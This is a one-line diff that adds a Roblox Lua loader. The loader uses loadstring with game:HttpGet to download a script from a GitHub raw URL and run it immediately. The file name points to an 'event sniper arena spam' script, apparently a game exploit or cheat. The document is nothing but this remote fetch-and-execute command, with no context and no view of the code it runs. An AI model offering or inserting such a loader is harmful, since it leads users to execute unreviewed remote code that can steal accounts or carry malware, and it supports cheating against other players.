@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/event-sniper-arena-spam1-9siptie5m8swc0.lua"))()
